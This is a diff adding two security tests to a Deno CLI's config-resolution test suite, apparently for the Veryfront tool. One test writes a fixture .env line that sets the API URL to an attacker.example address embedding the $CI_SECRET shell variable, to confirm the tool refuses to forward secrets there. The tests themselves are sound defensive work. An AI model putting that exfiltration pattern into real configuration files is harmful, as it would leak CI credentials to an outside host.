@@ -7,6 +7,7 @@ import "#veryfront/schemas/_test-setup.ts";
 import { assertEquals, assertInstanceOf, assertRejects } from "#veryfront/testing/assert.ts";
 import { describe, it } from "#veryfront/testing/bdd.ts";
 import {
+  assertApiUrlAcceptsNewCredential,
   createApiClient,
   isRetryableApiReadError,
   isUntrustedApiUrlCredentialError,
@@ -21,7 +22,11 @@ import type { EnvironmentConfig } from "#veryfront/config/environment-config.ts"
 import { makeTempDir } from "#veryfront/testing/deno-compat.ts";
 import { join } from "veryfront/platform/path";
 import { withTempDir } from "#veryfront/testing/deno-compat";
-import { __resetEnvLoaderForTests, loadEnv } from "veryfront/utils/env-loader";
+import {
+  __resetEnvLoaderForTests,
+  loadEnv,
+  markConfigFileSource,
+} from "veryfront/utils/env-loader";
 import { deleteToken, saveToken } from "../auth/token-store.ts";
 
 describe("isRetryableApiReadError", () => {
@@ -614,6 +619,63 @@ describe("resolveConfig", () => {
       restoreEnv("VERYFRONT_API_URL", originalApiUrl);
       restoreEnv("VERYFRONT_API_TOKEN", originalApiToken);
       restoreEnv("GITHUB_TOKEN", originalCiSecret);
+    }
+  });
+
+  it("refuses a literal env-file token when the endpoint expands a shell secret", async () => {
+    const tempDir = await makeTempDir();
+    const originalApiUrl = Deno.env.get("VERYFRONT_API_URL");
+    const originalApiToken = Deno.env.get("VERYFRONT_API_TOKEN");
+    const originalCiSecret = Deno.env.get("CI_SECRET");
+    const ciSecret = "path_secret_do_not_forward";
+
+    try {
+      __resetEnvLoaderForTests();
+      Deno.env.delete("VERYFRONT_API_URL");
+      Deno.env.delete("VERYFRONT_API_TOKEN");
+      Deno.env.set("CI_SECRET", ciSecret);
+      await Deno.writeTextFile(
+        join(tempDir, ".env"),
+        "VERYFRONT_API_URL=https://attacker.example/$CI_SECRET\n" +
+          "VERYFRONT_API_TOKEN=literal-project-token\n",
+      );
+      await loadEnv({ cwd: tempDir });
+
+      const env = createMockEnv({
+        apiUrl: Deno.env.get("VERYFRONT_API_URL"),
+        apiToken: "literal-project-token",
+        projectSlug: "test-project",
+      });
+      const error = await assertRejects(() => resolveConfig(tempDir, env), Error);
+
+      assertEquals(isUntrustedApiUrlCredentialError(error), true);
+      assertInstanceOf(error, Error);
+      assertEquals(error.message.includes(ciSecret), false);
+      assertEquals(error.message.includes("attacker.example"), false);
+      assertEquals(error.message.includes("Add a literal VERYFRONT_API_TOKEN"), false);
+    } finally {
+      __resetEnvLoaderForTests();
+      await Deno.remove(tempDir, { recursive: true });
+      restoreEnv("VERYFRONT_API_URL", originalApiUrl);
+      restoreEnv("VERYFRONT_API_TOKEN", originalApiToken);
+      restoreEnv("CI_SECRET", originalCiSecret);
+    }
+  });
+
+  it("refuses a config-derived endpoint hydrated from another project", async () => {
+    const tempDir = await makeTempDir();
+    try {
+      markConfigFileSource("VERYFRONT_API_BASE_URL", "/different-project/veryfront.json");
+      const env = createMockEnv({ apiBaseUrl: "https://project-controlled.example/api" });
+
+      await assertRejects(
+        () => assertApiUrlAcceptsNewCredential(env, tempDir),
+        Error,
+        "repository-configured API endpoint",
+      );
+    } finally {
+      __resetEnvLoaderForTests();
+      await Deno.remove(tempDir, { recursive: true });
     }
   });
 
